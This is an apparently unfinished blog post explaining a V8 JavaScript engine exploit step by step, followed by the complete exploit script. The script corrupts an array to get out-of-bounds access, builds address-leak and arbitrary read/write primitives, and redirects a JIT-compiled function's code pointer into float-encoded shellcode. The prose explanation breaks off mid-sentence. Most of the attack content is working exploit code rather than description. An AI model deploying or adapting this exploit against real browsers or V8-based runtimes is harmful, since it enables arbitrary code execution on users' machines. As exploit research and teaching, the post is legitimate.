---
layout: default
---

# Blog under construction (^_^)

# Understanding the exploit line by line

## Exploit Strategy

Find the address of an array in memory through OOB read found through corruptedArr

place another object, oobObjArr is placed after oobDblArr.

Using our out-of-bounds (OOB) read operation on oobDblArr, we can read the memory addresses of the objects stored in oobObjArr, which allows us to obtain the address of any V8 object.

Next, we place another double array, oobDblArr2, right after oobDblArr. By using the OOB write capability on oobDblArr, we overwrite the element field of oobDblArr2 to an object address. Accessing the elements of oobDblArr2 then enables us to read and write to arbitrary addresses.

```js
  var oobDblArr = [0x41, 0x42, 0x51, 0x52, 1.5];
  var oobDblArr2 = [0x41, 0x42, 1.5];
  var oobObjArr = [view, 0x424242];
  oobObjArr[0] = 0x414141;
```

```js
var dblIndex = searchDblArrIndex(arrAddr, corruptedArr, 0x40504000/2, 0x40508000/2, arrAddr + 0x1000);
```

We have large OOB read from corruptedArr. We try to find address of oobDblArr's element object. We do this by starting our search from an address (can be
see through DebugPrint(oobDblArr). This gives idea of where to start). We find the offset of that address from corruptedArr. We search the memory for numbers stored in oobDblArr. One thing to note is that oobDblArr is array of type double because it has a double precision number (1.5) in it. 0x41 is represented as 0x0000000040504000 and 0x42 is 0x0000000040508000. If we do DebugPrint(corruptedArr), we see that corruptedArr is SMI type array. Each index in oobDblArr jumps 8-bytes and for corruptedArr it jumps 4-bytes. We run loop and find the numbers but these numbers also appear before the oobDblArr. So, we need to run the loop again to find numbers at correct address.

```bash
0x01220019c111 <JSFunction func (sfi = 0x1220019b2e5)>
0x012200042139 <JSArray[524686]>
0x012200042191 <JSArray[0]>
0x0122000421d1 <JSArray[5]>
0x012200042239 <JSArray[3]>
0x012200042281 <JSArray[2]>
```

As we can see oobDblArr is at address 0x0122000421d1, so we start our search from a little before that say 0x42191.

```js
corruptedArr[dblIndex + 3] = 1;
```

We write 1 to `dblIndex + 3` because our first find of DblArrIndex is bogus and we patch it so we don't find it again in the search.

```js
let dblAddr = indexToAddr(dblIndex);
dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x1000);
console.log("oobDblAddr: " + indexToAddr(dblIndex).toString(16));
var oobDblIndex = dblIndex;
corruptedArr[dblIndex + 3] = 0x41;
```

We get the offset inside corruptedArr to the first found pattern and then start our search from there again. This time we find the original address of pattern that we intended to find. Again we patch the pattern to stop finding the same pattern again and again.

```js
if (dblIndex == null || oobDblArr[0] == 0x41) {
    console.log("cannot find dblIndex");
```

Then we check if we found the pattern or not. 

```js
else {
    corruptedArr[dblIndex - 3] = 0x100;
    console.log("oobDblArr new length: " + oobDblArr.length);
```

`corruptedArr[dblIndex]` points to `elements` member of `oobDblArr`. If we go back 3 double words (Addresses are 32-bit in v8) we get length member of array. We change that to 256 to get OOB read and write. 

```js
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
  corruptedArr[dblIndex + 3] = 1;
  dblAddr = indexToAddr(dblIndex);

  console.log(dblAddr.toString(16));
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
  console.log("oobDblAddr2: " + indexToAddr(dblIndex).toString(16));
  var oobDbl2Index = dblIndex;
```

Now we search for `oobDblAddr2's` element object member's address. Same as before, on first try we match the pattern but it is not in`obDblAddr2`, so we try again and get the correct address.

```js
  let objIndex = searchObjArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
  console.log(objIndex.toString(16));
  console.log("oobObjAddr: " + indexToAddr(objIndex).toString(16));
```

Next we find the address of `oobObjAddr's` element object member's address. We will place any object in this array and read it's address through OOB read in `oobDblAddr`.


```js
  var funcAddr = addrOf(func, (objIndex - oobDblIndex) >> 1); 
  console.log("func Addr: " + funcAddr.toString(16));
```

Now, we find the address of `func` function that has our floating point encoded shellcode. We use `(objIndex - oobDblIndex) >> 1`. As we have OOB read in `oobDblArr` of size 256, we calculate distance between `oobDblArr`and `oobObjArr`, place address of `func` in `oobObjArr[0]` and use OOB in `oobDblArr` to read address of `func` which is: `oobObjArr[0]`.

We are dividing by 2 because each element in `OobDblArr` is 8 bytes as opposed to 4 byte values in `corruptedArr` so each index would jump twice the memory.

```js
  var dblOffset = (oobDbl2Index - oobDblIndex - 5) >> 1;
  var codeAddr = read(funcAddr + 0x10, dblOffset)[0];
  console.log("code Addr: " + codeAddr.toString(16));
```

Next, we 






















































```js
function searchDblArrIndex(startAddr, corruptedArr, marker1, marker2, limit) {
    var startIndex = getOffset(startAddr);
    var end = getOffset(limit);
    var addr = startAddr;
    for (let idx = startIndex; idx < end; idx += 1) {
      if (corruptedArr[idx] == 0x40504000/2 && corruptedArr[idx + 2] == 0x40508000/2) {
        console.log("idx - 3:", (idx - 3).toString(16));
        console.log("addr at idx - 3 : ", indexToAddr(idx - 3).toString(16));
        return idx - 3;
      }
      addr += 4;
    }
  }
  
  function searchObjArrIndex(startAddr, corruptedArr, limit) {
    var startIndex = getOffset(startAddr);
    var end = getOffset(limit);
    for (let idx = startIndex; idx < end; idx += 1) {
      if (corruptedArr[idx] == 0x414141 && corruptedArr[idx + 1] == 0x424242) {
        return idx - 2;
      }
    }
  }
  
  function addrOf(obj, dblOffset) {
    console.log("obj value :", obj.toString(16));
    oobObjArr[0] = obj;
    var addrDbl = oobDblArr[dblOffset];
    console.log('dblOffset :', dblOffset.toString(16));
    console.log("addrOfFunc :", addrDbl.toString(16));
    // %SystemBreak();
    return ftoi32(addrDbl)[0];
  }
  
  function read(addr, dblArrOffset) {
    var oldValue = oobDblArr[dblArrOffset];
    oobDblArr[dblArrOffset] = i32tof(addr, 2);
    var out = ftoi32(oobDblArr2[0]);
    console.log("addr : ", addr.toString(16));
    console.log("out : ", out);
    oobDblArr[dblArrOffset] = oldValue;
    return out;
  }
  
  function write(addr, val1, val2, dblArrOffset) {
    var oldValue = oobDblArr[dblArrOffset];
    oobDblArr[dblArrOffset] = i32tof(addr, 2);
    oobDblArr2[0] = i32tof(val1, val2);
    oobDblArr[dblArrOffset] = oldValue;
    return; 
  }
  
  class A {}
  
  var gcSize = 0x4fe00000;
  
  //version dependent
  //Address of corruptedArr, serves as starting point of search, does not need to be too accurate
  var arrAddr = 0x42191;
  var emptyAddr = 0x219;
  
  var view = new ArrayBuffer(24);
  var dblArr = new Float64Array(view);
  var intView = new Uint32Array(view);
  var bigIntView = new BigInt64Array(view);
  
  function func() {
    return [1.9553825422107533e-246, 1.9560612558242147e-246, 1.9995714719542577e-246, 1.9533767332674093e-246, 2.6348604765229606e-284];
  }
  %DebugPrint(func);
  for (let i = 0; i < 1000; i++) func(0);
  
  var x = Array;
  
  class B extends A {
    constructor() {
      x = new.target;
      super();
    }
  }
  function construct() {
    var r = Reflect.construct(B, [], x);
    return r;
  }
  
  for (let i = 0; i < 2000; i++) construct();
  
  new ArrayBuffer(gcSize);
  new ArrayBuffer(gcSize);
  
  corruptedArr = construct();
  %DebugPrint(corruptedArr);
  corruptedArr = construct();
  %DebugPrint(corruptedArr);
  
  function getOffset(addr) {
    return (addr - emptyAddr)/4 - 2;
  }
  
  function indexToAddr(idx) {
    return (idx + 2) * 4 + emptyAddr;
  }
  
  function ftoi32(f) {
      dblArr[0] = f;
      console.log("intView[0] :", intView[0].toString(16));
      console.log("intView[1] :", intView[1].toString(16));
      return [intView[0], intView[1]];
  }
  
  function i32tof(i1, i2) {
      intView[0] = i1;
      intView[1] = i2;
      return dblArr[0];
  }
  
  function itof(i) {
      bigIntView = BigInt(i);
      return dblArr[0];
  }
  
  function ftoi(f) {
      dblArr[0] = f;
      return bigIntView[0];
  }
  
  //Use 1.5 so double representation can be interpreted as SMI to avoid deref crash
  var oobDblArr = [0x41, 0x42, 0x51, 0x52, 1.5];
  %DebugPrint(oobDblArr);
  var oobDblArr2 = [0x41, 0x42, 1.5];
  %DebugPrint(oobDblArr2);
  var oobObjArr = [view, 0x424242];
  %DebugPrint(oobObjArr);
  oobObjArr[0] = 0x414141;
  
  // We have large OOB read from corruptedArr. We try to find address of oobDblArr's element object. We do this by starting our search from an address (can be
  // see through DebugPrint(oobDblArr)). We find the offset of that address from corruptedArr. We search the memory for numbers stored in oobDblArr. One thing
  // to note is that oobDblArr is array of type double because it has a double precision number in it. 0x41 is represented as 0x0000000040504000 and 0x42 is
  // 0x0000000040508000. If we do DebugPrint(corruptedArr), we see that corruptedArr is SMI type array. Each index in oobDblArr jumps 8-bytes and for corruptedArr
  // it jumps 4-bytes. We run loop and find the numbers but these numbers also appear before the oobDblArr. So, we need to run the loop again to 
  // find numbers at correct address.

  var dblIndex = searchDblArrIndex(arrAddr, corruptedArr, 0x40504000/2, 0x40508000/2, arrAddr + 0x1000);
  console.log(dblIndex.toString(16));
  corruptedArr[dblIndex + 3] = 1;
  
  // The layout of array is : 
  // 

  let dblAddr = indexToAddr(dblIndex);
  console.log(dblAddr.toString(16));
  dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x1000);
  console.log(dblIndex.toString(16));
  console.log("oobDblAddr: " + indexToAddr(dblIndex).toString(16));

  var oobDblIndex = dblIndex;
  corruptedArr[dblIndex + 3] = 0x41;
  if (dblIndex == null || oobDblArr[0] == 0x41) {
    console.log("cannot find dblIndex");
  } else {
    corruptedArr[dblIndex - 3] = 0x100;
    console.log("oobDblArr new length: " + oobDblArr.length);

    dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
    console.log(dblIndex.toString(16));
    corruptedArr[dblIndex + 3] = 1;
    dblAddr = indexToAddr(dblIndex);

    console.log(dblAddr.toString(16));
    dblIndex = searchDblArrIndex(dblAddr, corruptedArr, 0x40504000/2, 0x40508000/2, dblAddr + 0x100);
    console.log(dblIndex.toString(16));
    console.log("oobDblAddr2: " + indexToAddr(dblIndex).toString(16));
    var oobDbl2Index = dblIndex;

    let objIndex = searchObjArrIndex(dblAddr, corruptedArr, dblAddr + 0x100);
    console.log(objIndex.toString(16));
    console.log("oobObjAddr: " + indexToAddr(objIndex).toString(16));

    var funcAddr = addrOf(func, (objIndex - oobDblIndex) >> 1); // dividing by 2 because each element in DblArr is 8 bytes as opposed to 4 byte values in corruptedArr
    console.log("func Addr: " + funcAddr.toString(16));

    var dblOffset = (oobDbl2Index - oobDblIndex - 5) >> 1;
    var codeAddr = read(funcAddr + 0x10, dblOffset)[0];
    console.log("code Addr: " + codeAddr.toString(16));
    
    var maglevAddr = read(codeAddr + 0x8, dblOffset);
    console.log("maglev Addr: " + maglevAddr[0].toString(16) + " " + maglevAddr[1].toString(16));
    
    %SystemBreak();

    write(codeAddr + 0x8, maglevAddr[0] + 0x80 + 2, maglevAddr[1], dblOffset);
    func();
  }
  
```